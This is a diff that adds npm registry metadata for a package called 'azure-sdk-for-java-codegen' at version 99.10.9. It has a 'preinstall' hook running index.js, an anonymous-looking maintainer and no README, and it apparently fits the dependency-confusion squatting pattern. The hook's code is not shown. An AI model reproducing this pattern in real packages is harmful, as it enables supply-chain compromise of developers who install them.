@@ -1,0 +1,62 @@
+{
+    "_id": "azure-sdk-for-java-codegen",
+    "name": "azure-sdk-for-java-codegen",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-sdk-for-java-codegen",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-sdk-for-java-codegen@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-BmZn0n6PdhNDTY2+r09L+dyCrcLOT/LGfo0N8NG04yLCkCCY7hVShVtiUdUt3BB3viZCnFCcTIGgeI/8EJwjMQ==",
+                "shasum": "540650aa9e111b6b8062d324d86aab464094e419",
+                "tarball": "https://registry.npmjs.org/azure-sdk-for-java-codegen/-/azure-sdk-for-java-codegen-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5078,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOsRAACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoQjw//VMM/FZ06a3hk2G/h+v0zM4g+uLFenym1RyjwCxeDPCF7JZoa\r\nUDFqqMSGNjv0j7MXaZksfohhSycHrDrs8pNlPi0psR4qLaMp7oi9c4FCg5DQ\r\n18Kv1E/ZD67oXLCXXh0jQPP/JNdrUQXoP5U3Fz8jJTytI1TxW2cS84fVZhD6\r\nSHZfAUOYqTbNUzCnTSIPZFuuYit3JxQkyIyYZoIgR2NUmhI3w6uUI5m4tBfS\r\nw6hyXLgBSstB74d7PvPc496LRGPP4+Mu13c5YLyP7b6WEQZQemkEuViW/836\r\n1+2Ls9hbID2/xg9LlU+8kFXYxusENO2gMsBhu8dNiCVNAcAp6PdJJ0kK4ixM\r\n+eQNSwkuqnVDhBglXU9IFpPfOnGf55Tqv0bO0CXY5egDmEBiF6eqNPwB3GKB\r\nEgtsD+auO7b1dmydjyARjBO2q+Dr/UXiXqHWldAOli0EEQKdbhxIrrmVyYZz\r\nl+e+e5jFUZuBMG3cpnqXYywY9X8Fyu7OvY4oLDj1EOEcbnpqQGKfwNZw478J\r\nd8pUNkoAnNalBOM2DL8EglY56fnY5OJDHBWDRn/A0DpQ9cVFgnNFK2wrO1K5\r\n0jMRhHCQSijQseBqZ28pOUs9W+vlhsfIUr8REe8MLUgWjkJPwc38WES8kJOy\r\nD6odGPyhIuyXfDZEGUCFn/hJ8OsTVU1GSYY=\r\n=x1gU\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "pqa7jjqy",
+                "email": "pqa7jjqy@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "pqa7jjqy",
+                    "email": "pqa7jjqy@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-sdk-for-java-codegen_99.10.9_1648018496256_0.11727326114038261"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T06:54:56.255Z",
+        "99.10.9": "2022-03-23T06:54:56.382Z",
+        "modified": "2022-03-23T06:54:56.491Z"
+    },
+    "maintainers": [
+        {
+            "name": "pqa7jjqy",
+            "email": "pqa7jjqy@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
